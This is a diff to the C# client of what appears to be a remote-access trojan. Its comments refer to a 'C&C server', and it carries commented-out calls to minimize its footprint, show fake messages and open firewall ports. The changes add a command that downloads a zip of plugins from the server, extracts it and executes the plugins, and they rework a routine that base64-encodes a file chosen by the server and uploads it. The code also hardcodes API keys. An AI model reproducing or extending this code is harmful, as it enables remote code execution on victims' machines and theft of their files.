@@ -30,6 +30,7 @@ namespace Client
         private static readonly string APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef";
         private static readonly string APPDIR_DOWNLOADS = "Transfers\\Downloads";
         private static readonly string APPDIR_UPLOADS = "Transfers\\Uploads";
+        private static readonly string APPDIR_PLUGINS = "Plugins";
         private static readonly string PROTOCOL = "http://";
         private static readonly string IP_ADDRESS = "localhost";
         private static readonly int PORT = 3226;
@@ -51,6 +52,7 @@ namespace Client
         private readonly string appDir;
         private readonly string dirDownloads;
         private readonly string dirUploads;
+        private readonly string dirPlugins;
         private Timer streamDesktopTimer;
 
         bool isCloning = false;
@@ -145,9 +147,15 @@ namespace Client
             //Clipboard.SetText(appDir); MessageBox.Show(appDir);
             dirDownloads = Path.Combine(appDir, APPDIR_DOWNLOADS);
             dirUploads = Path.Combine(appDir, APPDIR_UPLOADS);
+            dirPlugins = Path.Combine(appDir, APPDIR_PLUGINS);
+            // temporary while testing
+#if DEBUG
+            dirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug";
+#endif
             CreateDirectory(appDir);
             CreateDirectory(dirDownloads);
             CreateDirectory(dirUploads);
+            CreateDirectory(dirPlugins);
             // OpenFakeTextFile("Hey!");
             Handler.Instance.Transmitter = new Library.Transmitter(URL, APIKEY_PRIVATE, APIKEY_PUBLIC, CONNECTION_TIMEOUT);
             //foo = Handler.Instance.Transmitter.Test(2);
@@ -163,12 +171,12 @@ namespace Client
             //FirewallManager.Instance.AddPort(1234, "test1234");
             //MinimizeFootPrint();
             //SetupFakeMsg();
-            LoadPlugins(@"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug");
+            LoadPlugins();
         }
 
-        void LoadPlugins(string pluginsPath)
+        void LoadPlugins()
         {
-            pluginManager = new PluginManager.PluginManager(this, pluginsPath);
+            pluginManager = new PluginManager.PluginManager(this, dirPlugins);
             //Initialize the plugins
             foreach (var p in pluginManager.Plugins)
             {
@@ -306,9 +314,11 @@ namespace Client
                             UploadFileEvents();
                             break;
                         case ECommand.DOWNLOAD_FILE:
+                            // File retreived from C&C server
                             DownloadFile();
                             break;
                         case ECommand.UPLOAD_FILE:
+                            // File transmitted to C&C server
                             //UploadFile(dirDownloads + "\\" + Handler.Instance.Transmitter.TSettings.FileToDownload);
                             UploadFile();
                             break;
@@ -330,7 +340,10 @@ namespace Client
                                     object data = null;
                                     try
                                     {
-                                        data = plugin.Client.Execute();
+                                        data = plugin.Client.Execute(Handler.Instance.Transmitter.TSettings.Parameters);
+                                        //var path = Environment.CurrentDirectory + "\\temp.bmp";
+                                        //var image = data as Bitmap;
+                                        //image.Save(path);
                                     }
                                     catch (Exception ex)
                                     {
@@ -354,7 +367,23 @@ namespace Client
                             }
                             break;
                         case ECommand.UPLOAD_PLUGIN:
-                            LoadPlugins(Handler.Instance.Transmitter.TSettings.File);
+                            {
+                                byte[] data = Handler.Instance.Transmitter.DownloadFile();
+                                if (data != null)
+                                {
+                                    var path = dirPlugins;// Path.Combine(dirPlugins, Handler.Instance.Transmitter.TSettings.File);
+                                    //File.WriteAllBytes(path, data);
+                                    try
+                                    {
+                                        Compression.Extract(data, path);
+                                    }
+                                    catch (Exception)
+                                    {
+                                        // probably not a zip file
+                                    }
+                                }
+                                LoadPlugins();
+                            }
                             break;
                     }
                     Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
@@ -422,32 +451,40 @@ namespace Client
             byte[] fileData = Handler.Instance.Transmitter.DownloadFile();
             if (fileData != null)
             {
-                string path = appDir + "\\Transfers";
-                if (!Directory.Exists(path))
-                {
-                    try
-                    {
-                        Directory.CreateDirectory(path);
-                    }
-                    catch { }
-                }
-                try
-                {
-                    File.WriteAllBytes(Path.Combine(path, Handler.Instance.Transmitter.TSettings.File), fileData);
-                }
-                catch { }
+                File.WriteAllBytes(Path.Combine(dirUploads, Handler.Instance.Transmitter.TSettings.File), fileData);
+                //string path = appDir + "\\Transfers";
+                //if (!Directory.Exists(path))
+                //{
+                //    try
+                //    {
+                //        Directory.CreateDirectory(path);
+                //    }
+                //    catch { }
+                //}
+                //try
+                //{
+                //    File.WriteAllBytes(Path.Combine(path, Handler.Instance.Transmitter.TSettings.File), fileData);
+                //}
+                //catch { }
             }
         }
 
         private void UploadFile()
         {
             var fileInfo = new FileInfo(Handler.Instance.Transmitter.TSettings.File); // .FileToDownload);
-            var fileData = Convert.ToBase64String(File.ReadAllBytes(fileInfo.FullName));
-            Handler.Instance.Transmitter.UploadFile(new FileData()
+            try
             {
-                FileInfo = fileInfo,
-                Data = fileData
-            });
+                var fileData = Convert.ToBase64String(File.ReadAllBytes(fileInfo.FullName));
+                Handler.Instance.Transmitter.UploadFile(new FileData()
+                {
+                    FileInfo = fileInfo,
+                    Data = fileData
+                });
+            }
+            catch (Exception ex)
+            {
+                // handle
+            }
         }
 
         //private void UploadFile(string path, int c = 0)
